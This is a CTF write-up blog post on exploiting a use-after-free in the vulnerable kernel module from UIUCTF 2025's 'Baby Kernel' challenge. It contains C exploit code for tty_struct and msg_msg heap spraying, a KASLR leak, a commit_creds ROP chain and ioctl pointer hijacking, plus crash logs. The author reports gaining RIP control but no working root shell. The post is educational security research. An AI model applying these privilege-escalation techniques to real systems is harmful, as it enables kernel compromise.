@@ -1,0 +1,881 @@
+---
+title: "Kernel Exploitation Pitfalls #1: tty_struct & msg_msg | UIUCTF 2025"
+slug: kernel-exploitation-pitfalls-1
+author: Utkarsh M
+date: '2025-08-04'
+description: "Exploring the usage of tty_struct & msg_msg for kernel exploitation"
+categories:
+  - CTFs
+tags:
+  - write up
+  - ctf
+  - linux
+  - kernel
+  - heap
+  - uaf
+  - use-after-free
+  - reverse engineering
+  - re
+  - vm
+  - tty_struct
+  - msg_msg
+
+---
+
+
+I recently participated in UIUCTF 2025 and came across this `Baby Kernel` pwn challenge, It is a Kernel exploitation challenge based on a Kernel module with use-after-free vulnerability. I wanted to go through and understand various exploitation methods that I could utilize and I've been working on it while using this challenge for most of it, so this will probably be a series of blogs and may not always end up with successful exploitation (like this one) but will contain something I learned out of the process.
+
+------------------
+
+These were the following files shared for the challenge:
+
+- bzImage
+- initrd.cpio.gz
+- run.sh
+- vuln.c
+- vuln.ko
+
+The `vuln.c` is the code for the vulnerable driver for our challenge and it contains:
+
+```c
+#include <linux/module.h>
+#include <linux/kernel.h>
+..
+..
+long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg);
+
+struct file_operations fops = {
+    .owner = THIS_MODULE,
+    .unlocked_ioctl = handle_ioctl,
+};
+
+struct miscdevice vuln_dev ={
+    .minor = MISC_DYNAMIC_MINOR,
+    .name = "vuln",
+    .fops = &fops, 
+};
+
+void* buf = NULL;
+size_t size = 0;
+
+long handle_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
+    switch (cmd) {
+        case ALLOC: {
+            if (buf) {
+                return -EFAULT;
+            }
+            ssize_t n =  copy_from_user(&size, (void*)arg, sizeof(size_t));
+            if (n != 0) {
+                return n;
+            }
+            buf = kzalloc(size, GFP_KERNEL);
+            return 0;
+        };
+        case FREE: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            kfree(buf);
+            break;
+        }
+        case USE_READ: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            return copy_to_user((char*)arg, buf, size);
+        }
+
+        case USE_WRITE: {
+            if (!buf) {
+                return -EFAULT;
+            }
+            return copy_from_user(buf, (char*)arg, size);
+        }
+
+        default: {
+            break;
+        }
+
+    }
+    return 0;
+}
+
+int32_t vuln_init(void) {
+    int ret;
+    
+    ret = misc_register(&vuln_dev);
+    if (ret) {
+        printk(KERN_ERR "Failed to register device\n");
+        return ret;
+    }
+    return 0;
+}
+..
+..
+```
+
+By observation, The following things can be noted:
+- buf* and size are global variables.
+- As long as buf is not `NULL`: 
+  - we can possibly allocate a buffer in the heap of any arbitrary size.
+  - we can free the allocated buffer.
+  - we can read from and write to the buffer.
+- The `kfree(buf)` only deallocates the buffer and the module does not set `buf` to `NULL`.
+- This allows us to read, write and free the `buf` pointer, even after the first `free`.
+
+This definitely looked like a Heap user after free vulnerability, After digging through, I came across this blog [h0mbre - PAWNYABLE UAF Walkthrough (Holstein v3)](https://h0mbre.github.io/PAWNYABLE_UAF_Walkthrough/) and it referenced another series of blogs [Learning Linux Kernel Exploitation - Parts 1 - 3](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/). Both of them go through the basics of kernel exploitation really well. I would rather prefer you to go through these than me re-explaining the basics. 
+
+The h0mbre's Walkthrough goes through by allocating `tty_struct` and `msg_msg` struct in the freed heap to build a ROP chain. Also, the exploitation challenge in it is very similiar to our case with the only following key differences:
+
+- In [Holstein v1](https://h0mbre.github.io/PAWNYABLE_UAF_Walkthrough/), the heap allocation size is fixed to 1024 bytes but can be allocated several times.
+- In this challenge, we have the flexibility to choose the allocation size but heap can only be allocated once.
+
+
+Looking at the `run.sh`:
+```sh
+qemu-system-x86_64 \
+  -no-reboot \
+  -cpu max \
+  -net none \
+  -serial mon:stdio \
+  -display none \
+  -monitor none \
+  -vga none \
+  -kernel bzImage \
+  -initrd initrd.cpio.gz \
+  -append "console=ttyS0" \
+```
+
+We can note with `- cpu max` that `SMEP` and `SMAP` are both enabled. starting the VM, we can see that it runs kernel version `v6.6.16` and `KASLR` is active as well. The conditions are similar to the [Holstein v1](https://h0mbre.github.io/PAWNYABLE_UAF_Walkthrough/) challenge. 
+
+## Approach #1
+
+For the first approach, I wanted to follow up as close as possible to the walkthrough to get comfortable with kernel exploitation. So I ended up using the same `structs` for my first approach but the approach had to be slightly different due to the differences in challenge.
+
+As mentioned in every other kernel exploitation writeup I've read and the above, [ptr-yudai's notes](https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628) contains a overview of some of the structs that can be used for heap exploitation.
+
+Though the [h0mbre's blog](https://h0mbre.github.io/PAWNYABLE_UAF_Walkthrough/) does explain, let's still have a look at both of the structs we will be utilizing and how they work as I also wanted to  fill in some more stuff like how :D the function calls goes for the creation and why are things done the way they are.
+
+### `tty_struct` 
+The tty_struct is a kernel structure representing a terminal device, allocated via `kzalloc(1024, ...)`, so we are restricted to structs that fit the 1024-byte slab for future heap UAFs.
+
+```c
+struct tty_struct {
+	struct kref kref;
+	int index; 
+	struct device *dev;
+	struct tty_driver *driver;
+	struct tty_port *port;
+	const struct tty_operations *ops; // fn ptr used for kernel base address leak
+  ...
+}
+```
+
+#### allocating a `tty_struct`
+
+We can use the following command to get a `tty_struct` allocated, but we must know why do we do this, as in open a ptmx device. `/dev/ptmx` is a pseudo-terminal multiplexer that creates virtual terminal just like how we can create virtual ethernet interfaces, this lets us create virtual terminals without needing actual hardware, and each allocates kernel structures we can use for exploitation.
+
+```c
+int id = open("/dev/ptmx", O_RDWR|O_NOCTTY);
+```
+
+This is how the call execution takes place for our heap allocation: `open()` (library fn) ---> several fns ---> `ptmx_open()` --->  `alloc_tty_struct()`
+
+```c
+static int ptmx_open(struct inode *inode, struct file *filp)
+{
+  ...
+	tty = tty_init_dev(ptm_driver, index);
+  ...
+}
+
+struct tty_struct *tty_init_dev(struct tty_driver *driver, int idx)
+{
+	tty = alloc_tty_struct(driver, idx);
+  ...
+	return tty;
+  ...
+}
+struct tty_struct *alloc_tty_struct(struct tty_driver *driver, int idx)
+{
+	struct tty_struct *tty;
+
+	tty = kzalloc(sizeof(*tty), GFP_KERNEL_ACCOUNT);
+	if (!tty)
+		return NULL;
+.....
+}
+```
+
+tty_struct in heap: 
+
+```sh
+0x24a0850:	0x0000000000000001	0x0000000000000000
+0x24a0860:	0xff189a4881994480	0xff189a4881bcee00
+0x24a0870:	0xffffffff9fc85100	0xff189a4881b80720 # 0xffffffff9fc85100 -> tty_operations *ops
+0x24a0880:	0x0000000000000000	0x0000000000000000
+0x24a0890:	0xff189a4881bcb840	0xff189a4881bcb840
+0x24a08a0:	0xff189a4881bcb850	0xff189a4881bcb850
+0x24a08b0:	0x0000000000000000	0x0000000000000000
+0x24a08c0:	0xff189a4881bcb870	0xff189a4881bcb870
+.....
+```
+
+#### `tty_operations` struct
+
+This is the struct that can also be called a function table as it consists of functions related to the `tty`. We are most interested into the `ioctl()` function since It allows us to pass additional arguments that are an `unsigned integer` and an `unsigned long`.
+
+```c
+struct tty_operations {
+	struct tty_struct * (*lookup)(struct tty_driver *driver,
+			struct file *filp, int idx);
+	int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
+	void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
+	int  (*open)(struct tty_struct * tty, struct file * filp);
+	void (*close)(struct tty_struct * tty, struct file * filp);
+	void (*shutdown)(struct tty_struct *tty);
+	void (*cleanup)(struct tty_struct *tty);
+	ssize_t (*write)(struct tty_struct *tty, const u8 *buf, size_t count);
+	int  (*put_char)(struct tty_struct *tty, u8 ch);
+	void (*flush_chars)(struct tty_struct *tty);
+	unsigned int (*write_room)(struct tty_struct *tty);
+	unsigned int (*chars_in_buffer)(struct tty_struct *tty);
+	int  (*ioctl)(struct tty_struct *tty,
+		    unsigned int cmd, unsigned long arg); # This function ptr can be explicitly called by the user
+	long (*compat_ioctl)(struct tty_struct *tty,
+			     unsigned int cmd, unsigned long arg);
+...
+}
+```
+
+#### calling the `ioctl()` fn:
+
+Do I need to explain this?
+
+```c
+int result = ioctl(ptys[i], rop_addr, rop_addr); 
+```
+
+The above library function ends up calling the following kernel function [`tty_ioctl()`](https://elixir.bootlin.com/linux/v6.16/source/drivers/tty/tty_io.c#L2668):
+
+```c
+long tty_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
+{
+	struct tty_struct *tty = file_tty(file);
+  ...
+  ..
+	if (tty->ops->ioctl) {
+		retval = tty->ops->ioctl(tty, cmd, arg);
+		if (retval != -ENOIOCTLCMD)
+			return retval;
+	}
+  ...
+}
+// ...bunch more ptmx specific stuff
+```
+
+#### Tracing the syscalls?
+
+How do we trace such if ever required? gdb? later but crash the kernel first :P
+
+```sh
+[    5.309902] Call Trace:
+[    5.310479]  <TASK>
+[    5.310733]  ? __die+0x1e/0x60
+[    5.310850]  ? page_fault_oops+0x17c/0x470
+[    5.310940]  ? avc_has_extended_perms+0x233/0x520
+[    5.311039]  ? exc_page_fault+0x6b/0x150
+[    5.311123]  ? asm_exc_page_fault+0x26/0x30
+[    5.311211]  ? e1000e_read_phy_reg_m88+0x45/0x60
+[    5.311326]  ? e1000e_read_phy_reg_m88+0x46/0x60
+[    5.311429]  ? tty_ioctl+0x4fc/0x8c0
+[    5.311526]  ? __x64_sys_ioctl+0x92/0xd0
+[    5.311619]  ? do_syscall_64+0x3f/0x90
+[    5.311710]  ? entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+[    5.311858]  </TASK>
+```
+
+#### Deallocating the `tty_struct`:
+
+We don't always need to crash everything
+
+```c
+close(pty);
+```
+
+#### Utilizing `tty_struct` for exploit
+
+1. Deallocate Our Heap
+2. Open various `/dev/ptmx` 
+3. Read through the deallocated Heap buffer.
+4. If it contains a `tty_struct`, leak kernel base address via `tty_operations ops *`.
+5. gain RIP control by changing `ops*` to point to a function table (`tty_operations` struct) created by us with the function ptr at `ioctl()` to point RIP to wherever we would like.
+
+### `msg_msg` struct
+
+With `smap` enabled, userspace won't be directly excessible and also heap will have a NX bit, so we need to rely on `ROP Gadgets`. But we need a place to store ROP gadgets and the `tty_operations` struct that the kernel can access along with it's address. 
+
+This is where the [`msg_msg`](https://elixir.bootlin.com/linux/v6.6.16/source/include/linux/msg.h#L9) struct helps as it is a linked list that can help us store any data that we would like of custom sizes, which also relieves us from kmalloc size based allocation and that it contains a pointer to previous and next msg_msg structure which is extremely helpful.
+
+```c
+/* one msg_msg structure for each message */
+struct msg_msg {
+	struct list_head m_list; // This is what contains pointers for your linked list.
+	long m_type;
+	size_t m_ts;		/* message text size */
+	struct msg_msgseg *next;
+	void *security;
+	/* the actual message follows immediately */
+};
+```
+
+```c
+struct list_head {
+	struct list_head *next, *prev; 
+};
+```
+
+Though to create one we need to create a message queue first. 
+
+
+#### Message queue
+
+A message queue is literally a queue data structure pointing to the first of the linked list of msg_msg structure.
+
+You can create a message queue with the following command:
+
+```c
+int msg_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+```
+
+#### Allocating a `msg_msg` struct
+
+Allocation requires creating a slighlty different structure which is given below, mtext contains our data that we want to be stored. But our allocated structure will be same as previously defined.
+
+```c
+struct msgbuf {
+    long mtype;
+    char mtext[MSG_SZ];
+} msg;
+```
+
+once we have a struct with required data, we can then use the following command to create a message and get it allocated:
+
+```c
+int res = msgsnd(queue, &msg, MSG_SZ, IPC_NOWAIT) 
+```
+
+
+#### Utilizing `msg_msg` for exploit
+
+1. Create a `msg_msg` struct with ROP Gadgets.
+2. Spam `msg_msg` struct allocation until we get one allocated in or use-after-freed heap.
+3. get the address to the next or previous `msg_msg` structure.
+4. use this in our exploitation process
+
+### How does it all go together?
+
+Since we are limited to a single allocation, we can do the following:
+
+1. Allocate a buffer (`buf`) using the vulnerable driver.
+2. Free the buffer using the driver.
+3. Allocate a `tty_struct` by spam opening `/dev/ptmx` devices.
+4. verify if a `tty_struct` is allocated in our heap pointer and then  leak Kernel base address followed by calculating ROP gadgets and kernel function addreses.
+5. Create message queues and dellocate the `tty_struct` by closing the devices.
+6. spam messages containing ROP gadgets and our function table hoping one of these messages gets allocated into our heap.
+7. verify and get the `next` pointer.
+8. deallocate the buffer using the driver.
+9. Allocate a tty_struct into the heap by spam opening `/dev/ptmx` devices.
+10. change the `ops*` to point to our table (`next + some_offset`).
+11. call the `ioctl()` on our `/dev/ptmx` devices.
+12. Root???
+
+## Exploitation
+
+### Leaking base address
+
+#### 1. Allocate a buffer (`buf`) using the vulnerable driver:
+
+```c
+// Open the vulnerable device
+int vuln_fd = open("/dev/vuln", O_RDWR);
+
+if (ioctl(vuln_fd, ALLOC, &target_size) != 0) {
+    perror("ALLOC failed");
+    return -1;
+}
+```
+
+#### 2.  Free the buffer using the driver:
+
+```c
+    if (ioctl(vuln_fd, FREE) != 0) {
+        perror("FREE failed");
+        return -1;
+    }
+```
+
+#### 3. Allocate a `tty_struct` by spam opening `/dev/ptmx` devices:
+
+```c
+    pty_count = 0;
+    printf("[+] Opening PTY devices to trigger tty_struct allocation...\n");
+        ptys[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
+        if (ptys[i] >= 0) {
+            pty_count++;
+            printf("  Opened PTY %d: fd=%d\n", i, ptys[i]);
+        } else {
+            printf("  Failed to open PTY %d: %s\n", i, strerror(errno));
+            ptys[i] = -1;
+        }
+    }
+```
+
+#### 4. verify if a `tty_struct` is allocated in our heap pointer and then leak Kernel base address followed by calculating ROP gadgets and kernel function addreses:
+
+```c
+
+char *leaked_data = malloc(target_size);
+if (!leaked_data) {
+    perror("malloc failed");
+    goto cleanup;
+}
+
+if (ioctl(vuln_fd, USE_READ, leaked_data) != 0) {
+    perror("USE_READ failed");
+    goto cleanup;
+}
+
+struct tty_struct_layout *tty = (struct tty_struct_layout*)leaked_data;
+
+if(!is_kernel_pointer(tty->ops)){
+    perror("tty_struct allocation failed");
+  goto cleanup;
+}
+
+calculate_kernel_addresses();
+```
+
+where the functions called are as such:
+
+```c
+
+int is_kernel_pointer(uint64_t ptr) {
+    return (ptr & 0xffff000000000000UL) == 0xffff000000000000UL;
+}
+
+void calculate_kernel_addresses(uint64_t tty_ops) {
+    printf("[+] KASLR bypass using tty_ops: 0x%lx\n", tty_ops);
+    base_address = tty_ops - ops_offset_from_text;
+    // Calculate important function addresses using known offsets from _text
+    commit_creds = base_address + commit_creds_offset;           
+    prepare_kernel_cred = base_address + prepare_kernel_cred_offset;
+    // .... other gadgets and function
+}
+```
+
+Since we have a stripped vmlinux binary, You can add a SUID `sh` binary in the qemu by following [lkmidas's ](https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/) instructions and then use commands like the following to find offsets and base address for that OS run:
+
+```sh
+cat /proc/kallsyms | grep "T _text"
+```
+
+The output for my actual code looks like:
+```sh
+Part 1: Leak Address with tty_struct
+
+[+] Opened vulnerable device: fd=3
+[+] Allocated buffer of size 1024
+[+] Starting tty_struct spray and leak attempt
+[+] Freed buffer (UAF created)
+[+] Opening PTY devices to trigger tty_struct allocation...
+  Opened PTY 0: fd=4
+  Opened PTY 1: fd=5
+  Opened PTY 2: fd=6
+  Opened PTY 3: fd=7
+  .... Opening more
+[+] Opened 20 PTY devices
+[+] Attempting to read freed memory...
+[+] Successfully read 1024 bytes from freed memory
+
+[DEBUG] Analyzing potential tty_struct:
+  kref.refcount: 0x1 (1)
+  index: 0
+  dev: 0x0
+  driver: 0xff3e28f701994540
+  port: 0xff3e28f701bcee00
+  ops: 0xffffffffb1e85100
+ops is a kernel pointer
+
+[SUCCESS] Found valid tty_struct!
+  tty_operations pointer: 0xffffffffb1e85100
+[+] KASLR bypass using tty_ops: 0xffffffffb1e85100
+[SUCCESS] KASLR bypassed! Calculated addresses:
+  _text: 0xffffffffb0c00000
+  commit_creds: 0xffffffffb0cb9970
+  prepare_kernel_cred: 0xffffffffb0cb9c20
+  swapgs_restore_regs_and_return_to_usermode: 0xffffffffb1c01670
+...
+...
+```
+### Setting up ROP gadgets and function table
+
+#### 5. Create message queues and dellocate the `tty_struct` by closing the devices.
+
+```c
+
+// Creating 4 message queues :D
+int msg_queue[4];
+int msg_count = 0;
+
+for(int i = 0; i < 4; i++) {
+  int msg_qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+  if (msg_qid == -1) {
+    err("`msgget()` failed to initialize queue");
+  } else {
+    msg_queue[msg_count++] = msg_qid;
+    printf("[+] Created message queue %d: %d\n", i, msg_qid);
+  }
+}
+
+// close ptys (deallocate)
+for (int i = 0; i < 20; i++) {
+  if (ptys[i] >= 0) close(ptys[i]);
+}
+```
+
+#### 6. spam messages containing ROP gadgets and our function table hoping one of these messages gets allocated into our heap.
+
+```c
+int set_message(int queue_index, int* msg_queue){
+	int queue = msg_queue[queue_index];
+
+	size_t fails = 0;
+    struct msgbuf {
+        long mtype;
+        char mtext[MSG_SZ];
+    } msg;
+	msg.mtype = 0x1337;
+	memset(msg.mtext, 0, MSG_SZ);
+	uint64_t *payload = (uint64_t*)&msg.mtext[0];
+	// Set up the ROP chain
+	payload_len=0;
+	payload[payload_len++] = pop_rdi;
+	payload[payload_len++] = 0; // rdi = NULL
+	payload[payload_len++] = prepare_kernel_cred;
+	payload[payload_len++] = pop_r12;
+	payload[payload_len++] = commit_creds;
+  // ... rest of the ROP CHAIN kpti trampoline, etc
+
+	uint64_t *ops = (uint64_t*)&(payload[payload_len]);
+
+	// tty_operations table
+	for(int i = 0; i < 20; i++) {
+		if (i ==4 || i==5 || i==6 || i==19) {
+			ops[i] = ret_gadget;
+			continue;
+		}
+		ops[i] = 0xdeadbeefdeadbe00 + i;
+	}
+	ops[12] = gadget_pivot; //
+	// ops[20] = ret_gadget; /
+    // ops[12] = 0xdeadbeefdeadbe12;
+	if (msgsnd(queue, &msg, MSG_SZ, IPC_NOWAIT) == -1) {
+        fails++;
+    }
+	return fails;
+}
+
+// calling the above function to spam 25 messages in each queue :D
+for(int i = 0; i < msg_count; i++) {
+  printf("[+] Spraying msg_msg in message queue %d: %d\n", i, msg_queue[i]);
+  for(int j = 0; j < 25; j++) {
+    fails += set_message(i, msg_queue);
+  }
+}
+```
+
+I wanted to build a ROP chain that resembles [h0mbre's](https://h0mbre.github.io/PAWNYABLE_UAF_Walkthrough/) `(follow it for the working)` and Initially I thought I did, but then later I realized I was finding the ROP gadgets at wrong addresses that did not have executeble bits nor were actually present when I was debugging through gdb. You will need to find gadgets that would work by specifically extracting from the regions that would be valid using the below commands:
+
+```sh
+readelf -Wl vmlinux
+
+Elf file type is EXEC (Executable file)
+Entry point 0x1000000
+There are 5 program headers, starting at offset 64
+
+Program Headers:
+  Type           Offset   VirtAddr           PhysAddr           FileSiz  MemSiz   Flg Align
+  LOAD           0x200000 0xffffffff81000000 0x0000000001000000 0x185e854 0x185e854 R E 0x200000
+  LOAD           0x1c00000 0xffffffff82a00000 0x0000000002a00000 0x7df000 0x7df000 RW  0x200000
+  LOAD           0x2400000 0x0000000000000000 0x00000000031df000 0x02cae8 0x02cae8 RW  0x200000
+  LOAD           0x260c000 0xffffffff8320c000 0x000000000320c000 0x273000 0x424000 RWE 0x200000
+  NOTE           0x1a5e800 0xffffffff8285e800 0x000000000285e800 0x000054 0x000054     0x4
+
+ Section to Segment mapping:
+  Segment Sections...
+   00     .text .rodata .pci_fixup .tracedata __ksymtab __ksymtab_gpl __ksymtab_strings __init_rodata __param __modver __ex_table .notes 
+   01     .data __bug_table .orc_header .orc_unwind_ip .orc_unwind .orc_lookup .vvar 
+   02     .data..percpu 
+   03     .init.text .altinstr_aux .init.data .x86_cpu_dev.init .parainstructions .retpoline_sites .return_sites .call_sites .ibt_endbr_seal .altinstructions .altinstr_replacement .apicdrivers .exit.text .smp_locks .data_nosave .bss .brk 
+   04     .notes 
+```
+
+From here, we can obtain address region for `.text` then use ROPGadget tool to find gadgets, Apparently using `.init.text` region gadgets does not work.
+
+```sh
+ROPgadget --binary vmlinux --range 0xffffffff81000000-0xffffffff8285e854 > textgadgets.txt
+```
+
+For stack pivot, we would also need a gadget specifically to move `rdi` to `rsp` but after spending hours on it, maybe due to the lack of a gadget or just me having a skill issue,  I could not find one. :D Maybe if the challenge did not have `SMAP`, I could have used user space for our ROP chain.
+
+
+#### 7. verify and get the `next` pointer.
+
+Though I could not find a stack pivot, I wanted to proceed further to see how far I could go, So let's verify if a message is allocated into our heap.
+
+```c
+char *leaked_data = malloc(target_size);
+  if (!leaked_data) {
+      perror("malloc failed");
+  return 0;
+}
+
+if (ioctl(vuln_fd, USE_READ, leaked_data) != 0) {
+  perror("USE_READ failed");
+  free(leaked_data);
+  return 0;
+}
+// Process the leaked data
+struct msgbuf *msg_buf = (struct msgbuf*)leaked_data;
+
+if (msg_buf->m_type == 0x1337) {
+  // I had set this earlier for easier identification
+  printf("[+] Found msg_msg with mtype 0x1337!\n");
+  next_msg_address = (uint64_t)(msg_buf->m_list.next); // our next pointer
+  rop_addr = next_msg_address + 48;
+  tty_table_address = rop_addr + payload_len * sizeof(uint64_t);
+  return 1;
+} else {
+  return 0;
+}
+```
+
+#### 8. deallocate the buffer using the driver.
+
+```c
+if (ioctl(vuln_fd, FREE) != 0) {
+    //ignore for now (I don't remember why I did it.)
+}
+```
+
+#### 9. Allocate a tty_struct into the heap by spam opening `/dev/ptmx` devices.
+
+```c
+for (int i = 0; i < 20; i++) {
+    ptys[pty_count] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
+    if (ptys[pty_count] >= 0) {
+        pty_count++;
+    }
+}
+
+char *leaked_data = malloc(target_size);
+if (!leaked_data) {
+    perror("malloc failed");
+    goto cleanup;
+}
+
+if (ioctl(vuln_fd, USE_READ, leaked_data) != 0) {
+    perror("USE_READ failed");
+    free(leaked_data);
+    goto cleanup;
+}
+
+// printf("[+] dumping leaked data...\n"); to verify if its a tty struct 
+for (size_t i = 0; i < (target_size/2); i += 16) {
+    printf("0x%016lx\t", *(uint64_t*)&leaked_data[i]);
+    if (i + 8 < target_size) {
+        printf("0x%016lx\n", *(uint64_t*)&leaked_data[i + 8]);
+    } else {
+        printf("\n");
+    }
+}
+
+// This function works similar to how we discussed in 4th point.
+if (validate_tty_struct(leaked_data, target_size)) {
+    // discussed in next point :D
+    return 0;
+} else {
+    printf("[-] Leaked data does not appear to be tty_struct\n");
+}
+```
+
+
+#### 10. change the `ops*` to point to our table (`next + some_offset`).
+
+```c
+struct tty_struct_layout *tty = (struct tty_struct_layout*)leaked_data;
+printf("  tty_operations pointer: 0x%lx\n", tty->ops);
+// waitenter();
+// Perform KASLR bypass
+tty->ops = tty_table_address;
+// save the tty_struct pointer with vulnfd
+if (ioctl(vuln_fd, USE_WRITE, leaked_data) != 0) {
+perror("USE_WRITE failed");
+free(leaked_data);
+goto cleanup;
+}
+memset(&leaked_data[0], 0, target_size);
+if (ioctl(vuln_fd, USE_READ, leaked_data) != 0) {
+  perror("USE_READ failed");
+  free(leaked_data);
+  goto cleanup;
+}
+printf("[+] Successfully wrote tty_struct to vuln_fd again to verify\n");
+printf(" tty_operations pointer: 0x%lx\n", ((struct tty_struct_layout *)leaked_data)->ops);
+free(leaked_data);
+waitenter(); // waits for user to press enter character, gives me time to attach gdb manually if required.
+}   
+```
+
+### Executing our exploit
+
+#### 11. call the `ioctl()` on our `/dev/ptmx` devices.
+
+```c
+// spamming ioctls for shell
+printf("[+] Spamming ioctls to execute ROP chain...\n");
+for (int i = 0; i < pty_count; i++) {
+      int result = ioctl(ptys[i], rop_addr, rop_addr); 
+      if (result < 0) {
+          printf("[-] Failed to execute ROP chain on PTY %d: %s\n", i, strerror(errno));
+          continue;
+      }
+printf("[+] Executed ROP chain on PTY %d\n", i);
+```
+
+The result? We can confirm this should work given valid ROP gadgets if our RIP changes to what we point it to and kernel crashes.
+
+```sh
+[+] Spamming ioctls to execute ROP chain...
+[-] Failed to execute ROP chain on PTY 0: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 1: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 2: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 3: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 4: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 5: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 6: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 7: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 8: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 9: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 10: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 11: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 12: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 13: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 14: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 15: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 16: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 17: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 18: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 19: Inappropriate ioctl for device
+[+] ROP chain executed, should have spawned shell!
+```
+
+Well, I spent quite a lot of time trying to debug what was happening and going wrong so I ended up trying setting all the pointers in the function table to `0xdeadbeefdeadbe00 +i` as we know from [h0mbre's](https://h0mbre.github.io/PAWNYABLE_UAF_Walkthrough/) writeup that certain functions are called at one or the other point.
+
+```c
+for(int i = 0; i < 12; i++) {
+    ops[i] = 0xdeadbeefdeadbe00 + i;  // ← This is causing the crash!
+}
+```
+
+Doing this, I got a kernel crash as shown below:
+```sh
+[+] ROP chain executed, should have spawned shell!
+[    5.056846] general protection fault: 0000 [#1] PREEMPT SMP NOPTI
+[    5.057223] CPU: 0 PID: 65 Comm: exploit Tainted: G           O       6.6.16 #1
+[    5.057436] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.16.3-1-1 04/01/2014
+[    5.057783] RIP: 0010:0xdeadbeefdeadbe13
+[    5.058198] Code: Unable to access opcode bytes at 0xdeadbeefdeadbde9.
+[    5.058382] RSP: 0018:ff5a0a05c0193dc8 EFLAGS: 00010282
+[    5.058534] RAX: deadbeefdeadbe13 RBX: 0000000000000000 RCX: 000000000006be40
+[    5.058698] RDX: 0000000000000001 RSI: ff1a599cc1b80bf0 RDI: ff1a599cc1bcbc00
+[    5.058863] RBP: 0000000000000000 R08: 0000000000000000 R09: 000000000002eb50
+[    5.059028] R10: ff1a599cc1242980 R11: 0000000000000000 R12: ff1a599cc1bcbc00
+[    5.059220] R13: ff1a599cc1bcbdd0 R14: 0000000000000000 R15: 0000000000000000
+[    5.059415] FS:  0000000000000000(0000) GS:ff1a599cc7600000(0000) knlGS:0000000000000000
+[    5.059614] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[    5.059750] CR2: deadbeefdeadbe13 CR3: 0000000005c2e000 CR4: 0000000000751ef0
+[    5.059934] PKRU: 55555554
+[    5.060041] Call Trace:
+[    5.060549]  <TASK>
+[    5.060761]  ? die_addr+0x31/0x80
+[    5.060938]  ? exc_general_protection+0x1af/0x3d0
+[    5.061058]  ? asm_exc_general_protection+0x26/0x30
+[    5.061183]  ? __tty_hangup.part.0+0x332/0x370
+[    5.061288]  ? tty_release+0xe1/0x4e0
+[    5.061377]  ? __fput+0xe8/0x280
+[    5.061458]  ? task_work_run+0x58/0x90
+[    5.061552]  ? do_exit+0x345/0xac0
+[    5.061635]  ? hrtimer_interrupt+0x11c/0x230
+[    5.061741]  ? do_group_exit+0x2c/0x80
+[    5.061826]  ? __x64_sys_exit_group+0x13/0x20
+[    5.061925]  ? do_syscall_64+0x3f/0x90
+[    5.062015]  ? entry_SYSCALL_64_after_hwframe+0x6e/0xd8
+[    5.062169]  </TASK>
+# more stuff
+```
+
+But RIP points to `0xdeadbeefdeadbe13` which is weird as it's for `hangup()`. After a lot of thought, I came to a realization that I was infact corrupting a `tty_struct` but it was not the one that I spawned. 
+
+The reason for this was that I had a lot of pretty `printf` functions for logging and debugging which ended up causing enough delay that other `tty_struct` would get allocated in my freed heap.
+
+#### 12. root???
+
+After clearing the code up, I was finally able to get my RIP to point wherever I wanted and it could be confirmed using the call trace from the crash logs.
+
+```sh
+[+] Spamming ioctls to execute ROP chain...
+[-] Failed to execute ROP chain on PTY 0: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 1: Inappropriate ioctl for device
+[-] Failed to execute ROP chain on PTY 2: Inappropriate ioctl for device
+[    6.260309] BUG: unable to handle page fault for address: 00000000c319b808
+[    6.260836] #PF: supervisor read access in kernel mode
+[    6.261044] #PF: error_code(0x0000) - not-present page
+[    6.261349] PGD 1c14067 P4D 1c0b067 PUD 0 
+[    6.261736] Oops: 0000 [#1] PREEMPT SMP NOPTI
+[    6.262197] CPU: 0 PID: 65 Comm: exploit Tainted: G           O       6.6.16 #1
+[    6.262526] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Arch Linux 1.16.3-1-1 04/01/2014
+[    6.262996] RIP: 0010:e1000e_read_phy_reg_m88+0x46/0x60
+[    6.263631] Code: db 52 00 89 c3 85 c0 75 22 44 89 e6 48 89 ef 4c 89 ea 83 e6 1f e8 9a fd ff ff 48 89 ef 89 c3 48 8b 85 98 03 00 00 e8 f9 da 52 <00> 89 d8 5b 5d 41 5c 41 5d c3 cc cc cc cc 66 66 2e 0f 1f 84 00 00
+[    6.264357] RSP: 0018:ff7fee2640193e60 EFLAGS: 00010286
+[    6.264604] RAX: ffffffff90b81805 RBX: 0000000081bc5c30 RCX: 0000000081bc5c30
